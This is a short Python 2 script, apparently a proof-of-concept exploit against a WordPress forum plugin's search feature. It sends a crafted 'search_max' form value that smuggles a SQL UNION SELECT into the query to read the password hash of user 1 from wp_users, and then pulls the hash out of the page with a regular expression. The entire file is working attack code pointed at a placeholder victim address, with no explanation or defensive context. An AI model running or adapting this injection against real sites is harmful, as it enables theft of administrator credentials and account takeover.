#!/usr/bin/python

import urllib
import urllib2
import re

url = 'http://VICTIM_IP/wp/?p=5&wpforumaction=search'
values = {'search_words' : 'any',
          'search_submit' : 'Search',
          'search_max' : '999 DAY) union select 1,1,1,user_pass,1,1,1 from wp_users where id=1 or SUBDATE(CURDATE(), INTERVAL 9999' }

data = urllib.urlencode(values)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
output = response.read()
o = re.search('viewtopic.+>([$].+)<',output)
if o:
        print o.group(1)

